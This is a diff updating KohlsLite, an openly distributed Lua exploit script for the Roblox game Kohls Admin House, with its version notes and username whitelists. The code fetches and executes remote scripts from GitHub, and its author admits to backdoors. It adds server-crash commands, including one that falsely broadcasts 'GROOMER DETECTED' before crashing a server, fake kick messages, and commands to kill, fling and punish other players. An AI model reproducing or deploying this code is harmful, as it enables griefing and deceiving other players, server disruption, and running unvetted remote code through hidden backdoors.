@@ -1,8 +1,3 @@
--- One year since KohlsLite was created!
--- busy with my life updates might come soon idk
--- look at this clown: https://github.com/A28er348yg9434/Unknown/blob/main/Unknown
-
-
 --[[
  ___  __    ________  ___  ___  ___       ________  ___       ___  _________  _______      
 |\  \|\  \ |\   __  \|\  \|\  \|\  \     |\   ____\|\  \     |\  \|\___   ___\\  ___ \     
@@ -13,68 +8,78 @@
     \|__| \|__|\|_______|\|__|\|__|\|_______|\_________\|_______|\|__|    \|__|  \|_______|
                                             \|_________|                                   
                                                                                            
-                                                                                           v1Y ]]
+                                                                                           vX1.025 ]]
 
 --[[
-https://kohlslite.pages.dev/source.txt
+View the source here: https://kohlslite.pages.dev/source.txt
 
-This free, open-source script is for the Roblox game Kohls Admin House (KAH).
-You can play KAH here: https://www.roblox.com/games/112420803/Kohls-Admin-House-NBC-Updated
+KohlsLite is a free, open-source script for the Roblox game created by agspureiam, Kohls Admin House (KAH).
 This script was created by ScriptingProgrammer (Roblox) / ts2021 (Discord) / S-PScripts (GitHub).
 
-The longest/largest Kohls Admin House script freely available. (SCV3-VAR and Kozy.Docx are longer than KL but paid and not public respectively)
+You can play KAH (NBC version) here: https://www.roblox.com/games/112420803/Kohls-Admin-House-NBC-Updated
+You can also use it for KAH BC but barely anyone plays it. This script isn't recommended for KAH NP (it's not owned by agspureiam, there's a lot of things different).
 
-This script was built from the ground up. KohlsLite is NOT a fork of any other scripts. 
+KohlsLite is currently the longest/largest Kohls Admin House script freely available. SCV3-VAR and Kozy.Docx are longer than KL but they are paid and not public respectively.
 
-KohlsLite is LIKE a mixture of all the scripts that already exist in KAH such as:
-  -- > CMD (v1)
-  -- > CMD Y
-  -- > CMD v3 (Pi)
+This script was built from the ground up. KohlsLite is not a fork of any other scripts. (Such as Shortcut v2 src1 being an extension to Shortcut v1) 
+
+KohlsLite is a bit like a mixture of all the scripts that already exist in KAH such as:
+  -- > CMD (v1) [by quiving]
+  -- > CMD Y [by quiving]
+  -- > CMD v3 (Pi) [by quiving]
   -- > Shortcut v1
   -- > Shortcut v2
   -- > Shortcut v3
-  -- > Shortcut v3 VAR [don't have the source]
-  -- > PR Script
-  -- > ii's Stupid Admin
+  -- > Shortcut v3 VAR [don't have the source] [by Tech]
+  -- > ii's Stupid Admin [by iiDk]
+  -- > PR Script old [by Atprog]
   -- > KohlsNoob
-  -- > KohlsCool (maybe?)
+  -- > KohlsCool
   -- > Noobsploit
-  -- > Jotunnheim
-  -- > Shazam
-  -- > Route
-  -- > SimpleKAH
-  -- > XKah
-  -- > Scripts from S-PScripts/kah-fork
+  -- > Jotunnheim [by Jotunn]
+  -- > Shazam [by Tokio]
+  -- > Route [by Dizzy]
+  -- > SimpleKAH [by lnfiniteCoder]
+  -- > XKah [by lnfiniteCoder]
+  -- > Solinium [by Knocks]
+  -- > Infinite Yield
+  -- > Proton Admin [by Digitality]
+  -- > Many scripts from the KAH script archive by Damix [View it here: S-PScripts/kah-fork]
 
-Some of the code here is from other creators (and I credited) but quite a lot is my own and also some commands can't be changed code-wise that much.
+Some of the code here is from other creators, credit has been given, but quite a lot is my own and also some commands can't be changed code-wise that much.
 
-This script has not been discontinued but is not frequently updated as of now (due to me having school).
+This script does not get frequent updates anymore.
 
-There are no more watermarks in this script. This script does have back doors (dev section) due to idiots abusing like crazy using this script.
+There are no watermarks in this script. There used to exist, but I wanted to make this script more 'premium'.
+However, this script DOES have back doors (dev section) due to idiots abusing like crazy using this script.
 
-Support this script today by donating Robux to me on Roblox (especially since this script has limited advertising now).
+If you want to support this script, you can donate Robux to me on Roblox, especially since this script doesn't have much advertisements.
 
-Please do not edit this script by simply removing the dev section and then proceeding to abuse in KAH. It makes me annoyed!
-You can make your own script instead and you can take stuff from here if necessary.
+Please do not edit this script by simply removing the dev section and then proceeding to abuse in KAH. It makes me really annoying.
+Instead, you can make your own script and take stuff from here if necessary.
 
 Please don't go abusing like crazy using this script. I made this free/open-source and don't want idiots doing stuff that forces me to make this paid/obfuscated.
 
-I know this script is inconsistent with the fact it uses Game with and without GetService but I don't care.
+PS: I know my script is inconsistent when using Game with and without GetService... but I don't care.
+    Also, there is no command handler and this script looks terrible to be honest. I'm not rewriting this script (for the foreseeable future) as that would take ages.
 
 ]]
+
+-- Script name = KohlsLite
+getgenv().scriptname = "KohlsLite"
 
 -- Notifications
 local function Remind(msg)
         game.StarterGui:SetCore("SendNotification", {
-                Title = "KohlsLite 1Y",
+                Title = "KohlsLite X1.027", -- Why X1? Maybe because all the significant/main updates ae done.
                 Text = msg,
-                Duration = 1
+                Duration = 1 -- I know i could just do "1 or (a designated number)" but I don't really care.
         })
 end;
 
 local function LRemind(msg, length)
         game.StarterGui:SetCore("SendNotification", {
-                Title = "KohlsLite 1Y",
+                Title = "KohlsLite X1.027",
                 Text = msg,
                 Duration = length
         })
@@ -88,8 +93,10 @@ end
 
 getgenv().autocrasher = false
 
+getgenv().ignorewronggame = true
+
 if autocrasher then
-	--
+	-- I'll add it, idk when
 end
 
 if autocrasher then
@@ -106,22 +113,27 @@ if not game:IsLoaded() then
 end
 
 -- Place checker
-if game.PlaceId ~= 112420803 and game.PlaceId ~= 115670532  then 
-	local response = Instance.new("BindableFunction")
-	function response.OnInvoke(answer)
-		if answer == "Yes" then
-		    	game:GetService("TeleportService"):Teleport(112420803, game:GetService("Players").LocalPlayer) -- nbc only join, cry.
+
+if getgenv().ignorewronggame then 
+	--
+else
+	if game.PlaceId ~= 112420803 and game.PlaceId ~= 115670532  then 
+		local response = Instance.new("BindableFunction")
+		function response.OnInvoke(answer)
+			if answer == "Yes" then
+		    		game:GetService("TeleportService"):Teleport(112420803, game:GetService("Players").LocalPlayer) -- nbc join only.
+			end
 		end
-	end
-	game:GetService("StarterGui"):SetCore("SendNotification", {
+		game:GetService("StarterGui"):SetCore("SendNotification", {
 			Title = "KohlsLite Manager",
 			Text = "You are not in Kohls Admin House. Would you like to join KAH [NBC]?",
 			Duration = math.huge,
 			Callback = response,
 			Button1 = "Yes",
 			Button2 = "No"
-	})
-	return
+		})
+		return
+	end
 end
 
 --loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
@@ -133,7 +145,7 @@ getgenv().kohlsexecuted = true
 getgenv().deprefix = "." 
 
 -- The version of KohlsLite
-getgenv().klversion = "1Y"
+getgenv().klversion = "X1.025"
 
 -- KohlsLite Start Gui
 getgenv().kohlsgui = false
@@ -160,7 +172,7 @@ end
 -- Defaults (you can change these)
 local defaults = {".antirocket me", ".tnok", ".antikill me"} --".antimsg me"
 
--- Misc variables (ignore these)
+-- Misc variables (ignore these they are for bug fixes)
 local bending -- ignore
 local ratelj -- ignore
 local eincrash -- ignore
@@ -224,7 +236,7 @@ local pwl = {
     "Altsarecooleh",
     "Anka_707587",
     "atprog",
-    "BANNter_Original",
+   -- "BANNter_Original",
     "BIGpe7niss7",
     "clydekash",
     "D_ionte",
@@ -238,7 +250,7 @@ local pwl = {
     "E4_DQ",
     "Eggkid7",
     "grimAuxiliatrix",
-    "hudhejeir",
+    "nowhudhejeir",
     "IceStuds",
     "idonthacklol101ns",
     "Ih0temyIife",
@@ -264,7 +276,7 @@ local pwl = {
     "vgcrash",
     "whatveidone",
     "witnessfox22",
-    "yeyeyeweweweye",
+    "agspureiamReal",
     "YT_MATHEUSMODZ5"
 }
 
@@ -276,7 +288,7 @@ local nokick = {
     "Altsarecooleh",
     "Anka_707587",
     "atprog",
-    "BANNter_Original",
+ --   "BANNter_Original",
     "BIGpe7niss7",
     "clydekash",
     "D_ionte",
@@ -290,7 +302,7 @@ local nokick = {
     "E4_DQ",
     "Eggkid7",
     "grimAuxiliatrix",
-    "hudhejeir",
+    "nowhudhejeir",
     "IceStuds",
     "idonthacklol101ns",
     "Ih0temyIife",
@@ -316,7 +328,7 @@ local nokick = {
     "vgcrash",
     "whatveidone",
     "witnessfox22",
-    "yeyeyeweweweye",
+    "agspureiamReal",
     "YT_MATHEUSMODZ5"
 }
 
@@ -331,7 +343,7 @@ local pgwl = {
     "Altsarecooleh",
     "Anka_707587",
     "atprog",
-    "BANNter_Original",
+  --  "BANNter_Original",
     "BIGpe7niss7",
     "clydekash",
     "D_ionte",
@@ -345,7 +357,7 @@ local pgwl = {
     "E4_DQ",
     "Eggkid7",
     "grimAuxiliatrix",
-    "hudhejeir",
+    "nowhudhejeir",
     "IceStuds",
     "idonthacklol101ns",
     "Ih0temyIife",
@@ -371,7 +383,7 @@ local pgwl = {
     "vgcrash",
     "whatveidone",
     "witnessfox22",
-    "yeyeyeweweweye",
+    "agspureiamReal",
     "YT_MATHEUSMODZ5"
 }
 
@@ -384,14 +396,16 @@ local specialperms = {
     "IceStuds",
     "s_pisafurry",
     "kohlslitedev",
-    "yeyeyeweweweye"
+    "agspureiamReal",
+    "dawninja21",
+    "Dawninja21alt"
 }
 
 -- atprog spexialpermz (Perms for non-developers)
 local atprogperms = {
     "atprog",
     "IceStuds",
-    "decryptionites",
+    "Dekryptionite",
     "minecraftgamer2012YT",
     "clydekash",
     "ripcxo",
@@ -434,6 +448,7 @@ local carcar = {}
 
 -- Anti kill list, I didn't make it for any other antis so cry!
 local antikill = {}
+local antipunish = {}
 
 -- Gamepass saving 
 
@@ -1719,28 +1734,14 @@ game.Players.LocalPlayer.Chatted:Connect(function(msg)
            Remind("Check your console by running /console!")
         end
 
+        if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'kcmd2' then
+           CMDPrint2()
+           Remind("Check your console by running /console!")
+        end
+
         if string.sub(msg:lower(), 1, #prefix + 2) == prefix..'iy' then -- the classic
                    GExecute("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source")
 		   Remind("Executed Infinite Yield (IY).")
-        end
-
-	-- cmd v3
-	if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'myvis' then
-                if haspersons == true then
-                        Remind("The prefix is -")
-                        GExecute("https://raw.githubusercontent.com/S-PScripts/scripts/main/Luau/KAH/Main%20Scripts/MyVisualiser.lua")
-                else 
-                        Remind("Sorry, you need persons for this command!")
-                end
-        end 
-
-        if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'mydraw' then
-                if haspersons == true then
-                        Remind("The prefix is -")
-                        GExecute("https://raw.githubusercontent.com/S-PScripts/scripts/main/Luau/KAH/Main%20Scripts/MyVisualiser.lua")
-                else 
-                        Remind("Sorry, you need persons for this command!")
-                end
         end
 		
         if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'cmdpi' then -- well, you need that visualiser, do you?
@@ -1752,11 +1753,6 @@ game.Players.LocalPlayer.Chatted:Connect(function(msg)
 		end
         end
 
-        if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'prsc' then -- PR Script ~ atprog
-                GExecute("https://raw.githubusercontent.com/S-PScripts/scripts/main/Luau/KAH/People's%20Scripts/PR_Script.txt")
-		Remind("Executed PR Script. Created by atprog.")
-        end
-
         if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'cmdy' then -- you don't need this for attaching anymore ;)
                 GExecute("https://raw.githubusercontent.com/S-PScripts/KAH/main/CMD-Y%20(v1.56).lua")
 		Remind("Executed CMD Y/V2. Created by quiving.")
@@ -1764,6 +1760,7 @@ game.Players.LocalPlayer.Chatted:Connect(function(msg)
 
         if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'tricky' then -- CREDITS TO TECH
                 Remind("This might not work if it's already been executed. Sorry! Created by Tech")
+		Remind("Turn this off by typing music")
                 if haspersons == true then
                         GExecute("https://raw.githubusercontent.com/Tech-187/Music-lyrics-on-time/main/Tricky%20lyrics.lua")
                 else
@@ -1773,6 +1770,7 @@ game.Players.LocalPlayer.Chatted:Connect(function(msg)
 
         if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'ilove' then -- CREDITS TO TECH
                 Remind("This might not work if it's already been executed. Sorry! Created by Tech")
+		Remind("Turn this off by typing music")
                 if haspersons == true then
                         GExecute("https://raw.githubusercontent.com/Tech-187/Music-lyrics-on-time/main/I%20loveee.lua")
                 else
@@ -2061,9 +2059,9 @@ game.Players.LocalPlayer.Chatted:Connect(function(msg)
 			Remind("Blacklist/whitelist/gearwhitelist etc announcements enabled.")
 	end
 
-        if string.sub(msg, 1, #prefix + 6)  == prefix..'unblwlan' then
-			blwl_an = true
-			Remind("Blacklist/whitelist/gearwhitelist etc announcements enabled.")
+        if string.sub(msg, 1, #prefix + 8)  == prefix..'unblwlan' then
+			blwl_an = false
+			Remind("Blacklist/whitelist/gearwhitelist etc announcements disabled.")
 	end
 
        if string.sub(msg, 1, #prefix + 8) == prefix..'loopkill' then
@@ -3114,7 +3112,7 @@ game.Players.LocalPlayer.Chatted:Connect(function(msg)
     end
 
     if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'cmdbar' then
-	Remind("Created command bar! To remove it, you can't!")
+	Remind("Created command bar! To remove it, say uncmdbar.")
 	local Players = game:GetService("Players")
 	local UserInputService = game:GetService("UserInputService")
 
@@ -3160,6 +3158,16 @@ game.Players.LocalPlayer.Chatted:Connect(function(msg)
 	end
     end
 
+    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'uncmdbar' then
+    	local existingGui = player:FindFirstChild("PlayerGui"):FindFirstChild("CommandBarGui")
+    	if existingGui then
+        	existingGui:Destroy()
+        	Remind("Command bar removed!")
+    	else
+        	Remind("No command bar to remove!")
+    	end
+    end
+
     if string.sub(msg:lower(), 1, #prefix + 3) == prefix..'bok' then
           bokme = (string.sub(msg:lower(), #prefix + 5))
           SuperCMD("dog "..bokme)
@@ -3180,11 +3188,12 @@ game.Players.LocalPlayer.Chatted:Connect(function(msg)
     end
 
     if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'fixbp' then
-	print("a")
+	if not workspace.Terrain._Game.Workspace:FindFirstChild("Baseplate") then
+		Remind("NOT LOADED!")
+		return
+	end
 	if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'fixbp2' then
-		print("b")
 	else
-		print("c")
                 if movestatus == true then 
                         return 
                 end
@@ -3311,11 +3320,12 @@ game.Players.LocalPlayer.Chatted:Connect(function(msg)
     end
 
     if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'fixregen' then
-	print("a")
+	if not workspace.Terrain._Game.Admin:FindFirstChild("Regen") then
+		Remind("NOT LOADED!")
+		return
+	end
 	if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'fixregen2' then
-            	print("b")
         else
-		print("c")
                 if movestatus == true then
                         return 
                 end
@@ -3727,7 +3737,7 @@ game.Players.LocalPlayer.Chatted:Connect(function(msg)
 	end
     end
 
-    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'findregen' then -- i know it sucks but perm exists lol
+    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'findregen2' then -- i know it sucks but perm exists lol
         failsafe3 = false
 	regenfind2 = true
 	task.wait(0)
@@ -3819,7 +3829,7 @@ game.Players.LocalPlayer.Chatted:Connect(function(msg)
     if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'vgcrash' then
 	if skipwarncrash then -- idea from sinx
 		VGCrash()
-		Remind("VG Crashed the server.")
+		Remind("VG Crashed the server. (VG IS TEMPORARY BTW)")
 	else
 		local response = Instance.new("BindableFunction")
 		function response.OnInvoke(answer)
@@ -3842,7 +3852,7 @@ game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'cocrash' then
 	if skipwarncrash then -- idea from sinx
 		CoCrash()
-		Remind("VG Crashed (2) the server.")
+		Remind("VG Crashed (2) the server. (VG IS TEMPORARY BTW)")
 	else
 		local response = Instance.new("BindableFunction")
 		function response.OnInvoke(answer)
@@ -4214,7 +4224,7 @@ return
                 Remind("You should be attached to the player!")
     end
 
-		-- broken command
+		-- broken command, idk why :P
     if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'ncontrol' then -- really funny ngl (cmdpi)
         	local dasplayer = string.sub(msg:lower(), #prefix + 10)
                 PLAYERCHECK(dasplayer)
@@ -4462,7 +4472,15 @@ return
 		Chat("paint "..kneesurgery.. " blue")
 		Chat("gear "..kneesurgery.." guns")
 		Chat("h \n\n\n That feeling when knee surgery is today... \n\n\n")
-		Remind("that feeling when knee surgery is today")
+		Remind("That feeling when knee surgery is today...")
+    end
+
+   if string.sub(msg:lower(), 1, #prefix + 13) == prefix..'technoreaperx' then
+		Chat("char all 1702851506")
+		task.wait(1)
+		Speak("GROOMER DETECTED, TERMINATING SERVER")
+		task.wait(1)
+		Chat(prefix.."ecrash")
     end
 
     if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'headfloat' then -- yeah im adding scv1 cmds lol
@@ -4939,9 +4957,15 @@ return
     end
 
     if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'ecrash' then
+ 		local args = string.split(msg, " ")
+		if #args == 2 then
+			custardmessage = args[2]
+		else
+			custardmessage = "You have been kicked for suspicious behaviour."
+		end
         	Chat("fix")
         	musicsay = false
-            	Chat("h \n\n\n Error occured. Please join a different server. \n\n\n")
+            	Chat("h \n\n\n "..custardmessage.." \n\n\n")
 		Chat(prefix.."gmusic87")
            	Chat("fogcolor 0 0 0")
 		Chat("time 0")
@@ -4951,7 +4975,6 @@ return
 		skipwarncrash = true
             	DCrash()        
     end
-
 
     if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'jcrash' then
         	Chat("h/lol get crashed nerd")
@@ -6600,10 +6623,21 @@ end
 		Remind("Anti periastron is now enabled.")
     end
 
+    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'antiiv' then
+		antiperi = true
+		Remind("Anti periastron is now enabled.")
+    end
+		
     if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unantiperi' then
 		antiperi = false
 		Remind("Anti periastron is now disabled.")
     end
+
+    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'unantiiv' then
+		antiperi = false
+		Remind("Anti periastron is now disabled.")
+    end
+		
 
     if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'antiattach' then
 	if string.sub(msg:lower(), 1, #prefix + 11) == prefix..'antiattach2' then else
@@ -7331,36 +7365,66 @@ end
 
     if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'antipunish' then
         local args = string.split(msg, " ")
-        if args[2] == "me" then
-                antis.antipunish = true
-                Remind("Turned this anti on for you!")
-        elseif args[2] == "others" then
-                ALLantipunish = true
-                Remind("Turned this anti on for others!")
-        elseif args[2] == "all" then
-                antis.antipunish = true
-                ALLantipunish = true
-                Remind("Turned this anti on for everyone!")
-        else
-                Remind("Invalid argument: Must be me, others, or all")
-        end         
+	if #args == 2 then
+        	if args[2] == "me" then
+                	antis.antipunish = true
+                	Remind("Turned this anti on for you!")
+        	elseif args[2] == "others" then
+                	ALLantipunish = true
+                	Remind("Turned this anti on for others!")
+        	elseif args[2] == "all" then
+               		antis.antipunish = true
+                	ALLantipunish = true
+                	Remind("Turned this anti on for everyone!")
+        	else
+		  	kia = args[2]
+           	  	PLAYERCHECK(kia)
+	         	if player ~= nil then
+				if not table.find(antipunish, player) then
+					Remind(player.." is on the list now!")
+					table.insert(antipunish, player)
+				else
+					Remind(player.." is already in the table!")
+				end
+                 	else                           
+                        	Remind('Cannot find player with the name: '..dasplayer)
+			end
+                end
+	else
+                Remind("Invalid amount of arguments: Must be me, others, all or a player!")
+        end
     end
 
     if string.sub(msg:lower(), 1, #prefix + 12) == prefix..'unantipunish' then
         local args = string.split(msg, " ")
-        if args[2] == "me" then
-                antis.antipunish = false
-                Remind("Turned this anti off for you!")
-        elseif args[2] == "others" then
-                ALLantipunish = false
-                Remind("Turned this anti off for others!")
-        elseif args[2] == "all" then
-                antis.antipunish = false
-                ALLantipunish = false
-                Remind("Turned this anti off for everyone!")
-        else
-                Remind("Invalid argument: Must be me, others, or all")
-        end         
+        if #args == 2 then
+        	if args[2] == "me" then
+                	antis.antipunish = false
+                	Remind("Turned this anti off for you!")
+        	elseif args[2] == "others" then
+                	ALLantipunish = false
+                	Remind("Turned this anti off for others!")
+        	elseif args[2] == "all" then
+               		antis.antipunish = false
+                	ALLantipunish = false
+                	Remind("Turned this anti off for everyone!")
+        	else
+		  	kia = args[2]
+           	  	PLAYERCHECK(kia)
+	         	if player ~= nil then
+				if table.find(antipunish, player) then
+					Remind(player.." is no longer in the table!")
+					table.remove(antipunish, table.find(antipunish, player))
+				else
+					Remind(player.." was never in the list!")
+				end
+                 	else                           
+                        	Remind('Cannot find player with the name: '..dasplayer)
+			end
+                end
+	else
+                Remind("Invalid amount of arguments: Must be me, others, all or a player!")
+        end      
     end
 
     if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'antirocket' then
@@ -8107,7 +8171,7 @@ end
         	PLAYERCHECK(dasplayer)
         	if player == nil then 
 			return Remind("Fail: User not found!")
-		elseif player == "ScriptingProgrammer" or player == "atprog" or player == "kohlslitedev" then
+		elseif player == "ScriptingProgrammer" or player == "atprog" or player == "kohlslitedev" or player == "agspureiamReal" then
 			Remind("You can't bang developers!")
 		else
 			banger = cplr
@@ -8587,6 +8651,10 @@ end
 
 function CMDPrint()
 	GExecute("https://raw.githubusercontent.com/S-PScripts/scripts/refs/heads/main/Luau/KAH/Main%20Scripts/cmd-list.lua")
+end
+
+function CMDPrint2()
+	GExecute("https://raw.githubusercontent.com/S-PScripts/scripts/refs/heads/main/Luau/KAH/Main%20Scripts/cmd-list2.lua")
 end
 
 -- CHECK FOR PERM
@@ -9236,7 +9304,7 @@ connections[#connections + 1] =
 
 -- Credits to trollfacenan (bumanoid)!
 
-if game.PlaceId == 115670532 then
+if game.PlaceId == 112420803 then
 local lplr = game:GetService("Players").LocalPlayer
 local char = lplr.Character
 local tor = char:WaitForChild("Torso")
@@ -9437,7 +9505,7 @@ connections[#connections + 1] =
                                             end
                                 end
 
-                                if ALLantipunish == true then
+                                if ALLantipunish == true or table.find(antipunish, v.Name) then
                                             if game.Lighting:FindFirstChild(v.Name) then
                                                         Chat("unpunish "..v.Name)
                                           else end
@@ -13377,9 +13445,12 @@ function dncycle() -- 9jn said so, inspired by simplekah and kohlsnoob too
         local dntime = 7
         local decdn = 0
         while Loops.dncycle do
+		if Loops.dncycle == false then break end
                 task.wait(0.1)
                 for i = 1,24 do
+			if Loops.dncycle == false then break end
                 	for i = 1,59 do
+				if Loops.dncycle == false then break end
                             task.wait(0.1)
                             decdn = decdn + 1
                             Chat("time " .. dntime .. ":".. decdn)
@@ -13673,6 +13744,8 @@ function SpHammer()
                                 local args = string.split(msg, " ")
                                 if #args == 2 then
                                         mode = args[2]
+				else
+					Remind("ARGUMENT ERROR: You need to use exactly 2 (hmode _).")
                                 end
                    end
                 
@@ -13689,20 +13762,20 @@ function SpHammer()
 		print("hmode - set the mode")
 
 		print("- Mode -")
-		print("kill - used by default")
-		print("anchor - freezes the player")
-		print("unanchor - unfreezes the player")
-		print("nil - punishes player")
-		print("nan - sets size to nan")
-		print("smack - smacks the player (unequip hammer right after hitting someone with this enabled)")
-		print("spin - spins the player and plays music")
-		print("smite - paints player black and explodes them")
-		print("fling - flings the player")
-		print("label - gives them a random name")
-		print("furry - rawr")
-		print("fem - maid outfit")
-		print("color - paints the player a random color")
-		print("duck - quack quack")
+		print("kill - This is used by default. It kills the player")
+		print("anchor - Freezes the player")
+		print("unanchor - Unfreezes the player")
+		print("nil - Punishes the player")
+		print("nan - Sets the player's size to NaN")
+		print("smack - Smacks the player (unequip hammer right after hitting someone with this enabled)")
+		print("spin - Spins the player and plays music")
+		print("smite - Paints the player black and explodes them")
+		print("fling - Flings the player")
+		print("label - Labels the player a random name from the list")
+		print("furry - Turns them into a rawrrrrrrrrrrrrrrrrrrrrrrrr (furry)")
+		print("fem - Turns the player into a maid")
+		print("color - Paints the player a random colour")
+		print("duck - Turns them into a quack quack (duck)")
 
 		print("- Script by iiDk, ported for KohlsLite. -")
 
@@ -13785,7 +13858,7 @@ function SpHammer()
 		        Chat("name "..p.Parent.Name.." "..phrases[math.random(1,#phrases)])
 	        end
                 
-	        if mode == "furry" then
+	        if mode == "furry" or mode == "fur" then
 	            sound = 4821245570
 	            spawn(function()
 	                v = game.Players[p.Parent.Name]
@@ -13805,7 +13878,7 @@ function SpHammer()
                     end)
 	        end
                 
-	        if mode == "fem" then
+	        if mode == "fem" or mode == "femboy" then
 	            sound = 5064301214
 	            spawn(function()
 	                Chat("char "..p.Parent.Name.." 31342830")
@@ -13828,7 +13901,7 @@ function SpHammer()
                     end)
 	        end
                 
-	        if mode == "color" then
+	        if mode == "color" or mode == "colour" then
 		        Chat("paint "..p.Parent.name.." "..BrickColor.Random().Name)
 	        end
                 
@@ -13839,7 +13912,7 @@ function SpHammer()
 		        Chat("speed "..p.Parent.Name.." 0")
 	        end
                 
-	        if mode == "color" then
+	        if mode == "color" or mode == "colour" then
 		        Chat("music 11900833")
 	        else
 		        Chat("music "..tostring(sound))
@@ -13872,30 +13945,98 @@ musiclog = {}
 KL_FOLDER = "KohlsLite"
 if writefile and readfile then
 	if isfolder(KL_FOLDER) then
-		-- filler
+		print("KohlsLite folder found.")
 	else
 		makefolder("KohlsLite")
 		print("\n\n\n")
-		print("Created the KohlsLite folder! You can find in your workspace.")
+		print("Created the KohlsLite folder! You can find the folder in your workspace.")
+		repeat task.wait() until isfolder("KohlsLite")
 		local file_welcome = "KohlsLite/Welcome.txt"
 		local file_text = "Thank you for using KohlsLite! If you need help, please DM me at ts2021." --
 		writefile(KL_FOLDER,file_text)
 
--- ye this will be da new feature 
--- don't have windows pc to do it rn maybe 2025 guys
---[[
+		repeat task.wait() until isfile("KohlsLite/Welcome.txt")
+		getgenv().kohlsgui = true
 
-		local file_blacklist = "KohlsLite/Blacklisted.txt"
-		local file_whitelist = "KohlsLite/Whitelisted.txt"
-		local file_gearwhitelist = "KohlsLite/Gear whitelist.txt"
-
-		local file_bltext = "user etc etc"
-		-- this would be the new way of perm whitelist/blacklist/gearwhitelist
-
-
-		writefile(KL_FOLDER, ]]
 	end
+else
+	print("writefile or/and readfile permissions missing.")
 end
+
+if writefile and readfile then
+	if isfolder(KL_FOLDER) then
+		if isfile("KohlsLite/Blacklisted.json") and isfile("KohlsLite/Whitelisted.json") and isfile("KohlsLite/Gear Whitelisted.json") and isfile("KohlsLite/Hat Banned.json") then
+			print("All KohlsLite list files were found.")
+		else
+			if not isfile("KohlsLite/Blacklisted.json") then
+				writefile("KohlsLite/Blacklisted.json", game:GetService("HttpService"):JSONEncode({})) -- The JSON comes from Knocks!
+				print("Blacklist list missing - created!")
+			end
+
+			if not isfile("KohlsLite/Whitelisted.json") then
+    				writefile("KohlsLite/Whitelisted.json", game:GetService("HttpService"):JSONEncode({}))
+				print("Whitelist list missing - created!")
+			end
+
+			if not isfile("KohlsLite/Gear Whitelisted.json") then
+    				writefile("KohlsLite/Gear Whitelisted.json", game:GetService("HttpService"):JSONEncode({}))
+				print("Gear whitelist list missing - created!")
+			end
+
+			if not isfile("KohlsLite/Hat Banned.json") then 
+ 				writefile("KohlsLite/Hat Banned.json", game:GetService("HttpService"):JSONEncode({}))
+				print("Hat banned list missing - created!")
+			end
+
+    			repeat task.wait() until 
+			isfile("KohlsLite/Blacklisted.json") and 
+			isfile("KohlsLite/Whitelisted.json") and 
+			isfile("KohlsLite/Gear Whitelisted.json") and 
+			isfile("KohlsLite/Hat Banned.json")
+
+			print("Created KohlsLite file lists!")
+		end
+	else
+		print("KohlsLite folder not found. You should have it, so rejoin and re-execute KohlsLite.")
+	end
+else
+	print("writefile or/and readfile permissions missing.")
+end
+
+function readfiles()
+    if readfile and writefile then
+
+	-- Read blacklist
+        for i, v in game:GetService("HttpService"):JSONDecode(readfile("KohlsLite/Blacklisted.json")) do
+            if not table.find(blacklist, v) then
+                table.insert(blacklist, v)
+            end
+        end
+
+	-- Read whitelist
+        for i, v in game:GetService("HttpService"):JSONDecode(readfile("KohlsLite/Whitelisted.json")) do
+            if not table.find(whitelist, v) then
+                table.insert(whitelist, v)
+            end
+        end
+
+	-- Read gear whitelist
+        for i, v in game:GetService("HttpService"):JSONDecode(readfile("KohlsLite/Gear Whitelisted.json")) do
+            if not table.find(GWhitelisted, v) then
+                table.insert(GWhitelisted, v)
+            end
+        end
+
+	-- Read hatkick on sight list
+        for i, v in game:GetService("HttpService"):JSONDecode(readfile("KohlsLite/Hat Banned.json")) do
+            if not table.find(hatkick_on_sight, v) then
+                table.insert(hatkick_on_sight, v)
+            end
+        end
+    end
+end
+
+readfiles()
 
 task.spawn(function()
 	while true do
@@ -15095,7 +15236,7 @@ end
 
 -- // COLOR API \\ --
 -- // the reason why there's dupes is because of rainbow map needing the RGB instead of colour name and the api not having a conversion \\ --
-
+-- // and im a crap codaaaaaa \\ --
 colorAPI = {}
  
 colorAPI.color = function(Part, color)
@@ -15442,7 +15583,6 @@ ___  __    ________  ___  ___  ___       ________  ___       ___  _________  ___
     \|__| \|__|\|_______|\|__|\|__|\|_______|\_________\|_______|\|__|    \|__|  \|_______| 
                                             \|_________|                           
 ]])
-print("1 year!")
 
 Stats.loadedtime = string.format("%.2f", os.clock() - Stats.starttime)
 
@@ -15457,7 +15597,7 @@ local OWNER = {
 	"s_pisafurry", 
 	"kohlslitedev", 
 	"IceStuds", 
-        "yeyeyeweweweye"
+        "agspureiamReal"
 }
 
 local DEVELOPER = {
@@ -15472,8 +15612,8 @@ local ADMIN = {
     "ripcxo",
     "grimAuxiliatrix",
     "undertaker629",
-   -- "dawninja21",
-  --  "dawninja21alt",
+    "dawninja21",
+    "dawninja21alt",
     "jjjuuikjjikkju"
 }
 
@@ -15495,8 +15635,8 @@ Stats.rank = rankcheck(Stats.username)
 
 print("Your rank is: " .. Stats.rank)
 
--- atprog's funny thing ...
